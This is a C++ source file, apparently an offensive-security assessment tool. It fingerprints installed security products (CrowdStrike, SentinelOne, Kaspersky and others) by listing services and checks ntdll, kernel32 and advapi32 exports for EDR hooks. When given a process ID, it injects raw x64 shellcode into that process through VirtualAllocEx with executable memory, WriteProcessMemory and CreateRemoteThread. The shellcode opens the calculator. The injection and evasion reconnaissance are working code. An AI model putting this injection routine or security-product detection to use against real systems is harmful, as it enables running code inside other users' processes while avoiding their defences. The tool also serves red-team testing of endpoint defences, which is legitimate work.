#include <windows.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <fstream>
#include <iterator>
#include <string>
#include <tlhelp32.h>


const std::vector<std::string> falsePositives = {
    "NtGetTickCount", "NtQuerySystemTime", "NtdllDefWindowProc_A",
    "NtdllDefWindowProc_W", "NtdllDialogWndProc_A", "NtdllDialogWndProc_W", "ZwQuerySystemTime"
};

struct SecurityVendor {
    std::string identifier;
    std::string vendorName;
};

bool checkDescription(const std::string& output, const std::string& identifier) {
    return output.find(identifier) != std::string::npos;
}

std::vector<std::string> DLLs {
    "ntdll.dll", "advapi32.dll", "kernel32.dll"
};


void printError(std::string e) {
    std::cout << "[-] " << e << std::endl;
}

void printInfo2(std::string i) {
    std::cout << "[*] " << i << std::endl;
}

void printSuccess(std::string s) {
    std::cout << "[+] " << s << std::endl;
}

void detectSecurityVendor() {
    system("sc queryex type= service > services.txt");

    std::string outputFileName = "services.txt";

    std::ifstream file(outputFileName);
    if (!file.is_open()) {
        printError("Failed to open temporary services file");
        return;
    }

    std::string output((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();


    if (!DeleteFileA(outputFileName.c_str())) {
        printError("Failed to delete temporary services file");
    }

    std::vector<SecurityVendor> vendors = {
        {"CrowdStrike", "CrowdStrike"},
        {"Cortex XDR", "Palo Alto Cortex XDR"},
        {"AVP", "Kaspersky"},
        {"McAfee", "McAfee"},
        {"AVG", "AVG"},
        {"SentinelOne", "SentinelOne"},
        {"Elastic", "Elastic"},
        {"Cybereason", "Cybereason EDR"}
    };

    bool found = false;
    for (const auto& vendor : vendors) {
        if (checkDescription(output, vendor.identifier)) {
            printSuccess(vendor.vendorName + " is identified in the services.");
            found = true;
            break;
        }
    }

    if (!found) {
        printInfo2("No known security vendor identified in the services");
    }
}

std::vector<std::string> GetFunctionBytes(BYTE* addr) {
    BYTE bytesInstruction[4] = {};
    SIZE_T bytesRead;
    ReadProcessMemory(GetCurrentProcess(), addr, &bytesInstruction, sizeof(bytesInstruction), &bytesRead);

    std::vector<std::string> bytesInstructionHex;
    for (const auto& byte : bytesInstruction) {
        std::stringstream ss;
        ss << std::hex << (int)byte;
        bytesInstructionHex.push_back(ss.str());
    }
    return bytesInstructionHex;
}

BYTE* GetFunctionAddressOnDisk(const std::vector<char>& fileBuffer, HMODULE memoryModule, BYTE* funcAddrInMemory) {
    DWORD offset = (DWORD)(funcAddrInMemory - (BYTE*)memoryModule);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)&fileBuffer[0];
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dosHeader + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeaders = (PIMAGE_SECTION_HEADER)(ntHeaders + 1);

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (offset >= sectionHeaders[i].VirtualAddress &&
            offset < sectionHeaders[i].VirtualAddress + sectionHeaders[i].Misc.VirtualSize) {
            DWORD diskOffset = offset - sectionHeaders[i].VirtualAddress + sectionHeaders[i].PointerToRawData;
            return (BYTE*)&fileBuffer[diskOffset];
        }
    }

    return nullptr;
}



typedef NTSTATUS(NTAPI* PFN_NTSETCONTEXTTHREAD)(
    HANDLE ThreadHandle,
    const CONTEXT* Context
    );


void checkHookUsingOnDiskFile(HMODULE hModule, std::string functionName, std::vector<char> dllBytes) {

    BYTE* procAddressMemory = (BYTE*)GetProcAddress(hModule, functionName.c_str());
    BYTE* procAddressDisk = GetFunctionAddressOnDisk(dllBytes, hModule, procAddressMemory);


    if (!procAddressMemory) {
        std::cerr << "Error getting proc address in memory for: " << functionName << std::endl;
        return;
    }

    auto bytesMemory = GetFunctionBytes((BYTE*)procAddressMemory);
    auto bytesDisk = GetFunctionBytes((BYTE*)procAddressDisk);

    if (bytesMemory != bytesDisk) {
            printSuccess("Hooked: " + functionName);
            std::cout << "   Memory bytes: ";
            for (const auto& byteHex : bytesMemory) {
                std::cout << byteHex << " ";
            }
            std::cout << "\n   Disk bytes: ";
            for (const auto& byteHex : bytesDisk) {
                std::cout << byteHex << " ";
            }
            std::cout << std::endl;
        }
}

// adopted from: https://github.com/anthemtotheego/Detect-Hooks/blob/main/src/detect-hooks.c#L46
void checkHookUsingSyscallPrologue(HMODULE hModule, std::string functionName) {

    BYTE* procAddressMemory = (BYTE*)GetProcAddress(hModule, functionName.c_str());
    char syscallPrologue[4] = { 0x4c, 0x8b, 0xd1, 0xb8 };


    if (memcmp(procAddressMemory, syscallPrologue, 4) != 0) {

        printSuccess(functionName + " is hooked according to syscall prologue check ");
        std::cout << "   Memory bytes: ";
        auto bytesMemory = GetFunctionBytes((BYTE*)procAddressMemory);

        for (const auto& byteHex : bytesMemory) {
            std::cout << byteHex << " ";
        }
        std::cout << std::endl;

    }
}


int checkHook(std::string dll) {


    HMODULE hModule = GetModuleHandleA(dll.c_str());
    if (!hModule) {
        printError("Error getting " + dll + " handle: " + std::to_string(GetLastError()));
        return 1;
    }

    std::ifstream dllFile("c:\\windows\\system32\\" + dll, std::ios::binary);
    if (!dllFile) {
        printError("Error opening ntdll.dll from disk.");
        CloseHandle(hModule);
        return 1;
    }

    std::vector<char> dllBytes((std::istreambuf_iterator<char>(dllFile)), std::istreambuf_iterator<char>());

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* functionNameRVAs = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        char* functionName = (char*)((BYTE*)hModule + functionNameRVAs[i]);
        std::string sFunctionName(functionName);

        if (sFunctionName.substr(0, 2) == "Nt" || sFunctionName.substr(0, 2) == "Zw") {

            if (std::find(falsePositives.begin(), falsePositives.end(), functionName) == falsePositives.end()) {

                checkHookUsingOnDiskFile(hModule, sFunctionName, dllBytes);
                checkHookUsingSyscallPrologue(hModule, sFunctionName);
            }
        }
    }
    dllFile.close();
}


void testSuspiciousCall(int pid) {
    std::cout << "\n-----------------------------" << std::endl;
    std::cout << "| Suspicious call Detection |" << std::endl;
    std::cout << "-----------------------------" << std::endl;


    //Opening up Calculator x64
    unsigned char shellcode[] =
        "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
        "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
        "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
        "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
        "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
        "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
        "\x48\x83\xec\x20\x41\xff\xd6";

    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;

    printInfo2("Injecting to PID: " + std::to_string(pid));
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

    // basic error checking, won't print error information
    if (processHandle) {
        remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
        if (remoteBuffer) {
            if (WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL)) {
                remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
                printSuccess("injection completed successfully...");
                CloseHandle(processHandle);
                return;
            }
        }

    }   
    //This is not super helpful because we don't know which function failed, should be fixed with proper error checking
    printError("failed to inject: " + std::to_string(GetLastError()));
}


void printHeader() {

    std::cout << "--------------------------------------" << std::endl;
    std::cout << "| Author    :  Ahmad Almorabea       |" << std::endl;
    std::cout << "| X(Twitter):  @almorabea            |" << std::endl;
    std::cout << "| Website   :  https://almorabea.net |" << std::endl;
    std::cout << "--------------------------------------" << std::endl;

    std::cout << "" << std::endl;

    std::cout << "-----------------------------" << std::endl;
    std::cout << "| Security Vendor Detection |" << std::endl;
    std::cout << "-----------------------------" << std::endl;

}


void printInfo(std::string info) {
    std::cout << "\n-----------------------------" << std::endl;
    std::cout << "| " << info << " | " << std::endl;
    std::cout << "-----------------------------" << std::endl;
}


int main(int argc, char* argv[]) {

    printHeader();

    detectSecurityVendor();


    printInfo("checking hooks...");


    for (std::string s : DLLs)
    {
        printInfo2("checking " + s + " for hooks..");
        checkHook(s);
    }


    if (argc > 1) {
        printInfo("Testing shellcode injection");
        testSuspiciousCall(atoi(argv[1]));
    }


    printInfo("End of Report");

    return 0;
}
